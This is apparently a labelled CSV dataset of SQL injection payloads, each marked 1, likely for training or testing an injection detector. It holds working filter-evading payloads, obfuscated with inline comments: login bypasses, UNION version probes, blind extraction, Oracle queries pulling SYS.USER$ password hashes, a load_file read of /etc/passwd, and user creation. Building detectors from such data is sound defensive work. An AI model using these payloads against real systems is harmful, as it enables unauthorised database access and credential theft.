Query,Label
""" o/**/r pg_sleep  (  __TIME__  )  --",1
cr/**/eate user name identified b/**/y pass123 tempo/**/rary tabl/**/espace temp default ta/**/blespace users;,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SE/**/LECT DI/**/STI/**/NCT  (  tab/**/le_name  )   F/**/ROM   (  SEL/**/ECT DI/**/STI/**/NCT  (  ta/**/ble_name  )  , ROWNUM AS LIMI/**/T FR/**/OM sys.all_tab/**/les  )   WHE/**/RE LIMI/**/T  =  5   )    )    AN/**/D 'i'  =  'i",1
" se/**/lect * fr/**/om users w/**/here id  =  '1' o/**/r @ @1  =  1 union selec/**/t 1,version  (    )   -- 1'",1
" sele/**/ct * fro/**/m users whe/**/re id  =  1 o/**/r 1#""  (   union s/**/elect 1,version  (    )   -- 1",1
 sele/**/ct name f/**/rom syscolumns whe/**/re id   =     (  s/**/elect id fro/**/m sysobjects wher/**/e name   =   t/**/ablename'  )  --,1
se/**/lect * fr/**/om users w/**/here id  =  1 +$+ o/**/r 1  =  1 -- 1,1
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",1
" sele/**/ct * fro/**/m users whe/**/re id  =  '1' o/**/r ||/1  =  1 union sele/**/ct 1,version  (    )   -- 1'",1
" se/**/lect * fr/**/om users w/**/here id  =  '1' o/**/r \.<\ union selec/**/t 1,@@VERSION -- 1'",1
? o/**/r 1  =  1 --,1
 )   o/**/r   (  'a'  =  'a,1
admi/**/n' o/**/r 1  =  1#,1
" selec/**/t * fr/**/om users whe/**/re id  =  1 o/**/r ""  (  ]"" o/**/r 1  =  1 -- 1",1
o/**/r 1  =  1 --,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SE/**/LECT DI/**/STI/**/NCT  (  column_name  )   F/**/ROM   (  SE/**/LECT DI/**/STI/**/NCT  (  column_name  )  , ROWNUM AS LIMI/**/T F/**/ROM all_tab_columns  )   W/**/HERE LI/**/MIT  =  5   )    )    A/**/ND 'i'  =  'i",1
" sel/**/ect * f/**/rom users wh/**/ere id  =  '1' %!<@ union se/**/lect 1,version  (    )   -- 1'",1
" sele/**/ct * f/**/rom users w/**/here id  =  1 o/**/r ""&  (  "" o/**/r 1  =  1 -- 1",1
" selec/**/t * f/**/rom users wher/**/e id  =  1 o/**/r ""?  (  "" o/**/r 1  =  1 -- 1",1
di/**/sti/**/nct,1
sele/**/ct * fro/**/m users wher/**/e id  =  '1' *  (  \  )   o/**/r 1  =  1 -- 1',1
"1 an/**/d a/**/scii  (  lower  (  substri/**/ng   (    (   s/**/elect top 1 name fro/**/m sysobjects wh/**/ere xtype  =  'u'  )  , 1, 1   )    )     )   > 116",1
sele/**/ct * fr/**/om users w/**/here id  =  1 o/**/r \.<\ o/**/r 1  =  1 -- 1,1
"admi/**/n"" o/**/r ""1""  =  ""1""--",1
" sel/**/ect * f/**/rom users wher/**/e id  =  1 o/**/r ""%{"" o/**/r 1  =  1 -- 1",1
i/**/n/**/sert,1
" se/**/lect * fro/**/m users wh/**/ere id  =  1 o/**/r 1#""?  =  1 o/**/r 1  =  1 -- 1",1
" sele/**/ct * f/**/rom users w/**/here id  =  1 o/**/r ""%?"" o/**/r 1  =  1 -- 1",1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SEL/**/ECT DI/**/STI/**/NCT  (  PASSWO/**/RD  )   FRO/**/M   (  SEL/**/ECT DI/**/STI/**/NCT  (  PASSWO/**/RD  )  , ROWNUM AS LIMI/**/T FRO/**/M SYS.USER$  )   WHE/**/RE LIM/**/IT  =  8   )    )    A/**/ND 'i'  =  'i",1
" se/**/lect * f/**/rom users w/**/here id  =  1 o/**/r ""?#"" o/**/r 1  =  1 -- 1",1
"o/**/r 1  =  1 o/**/r """"  =  ",1
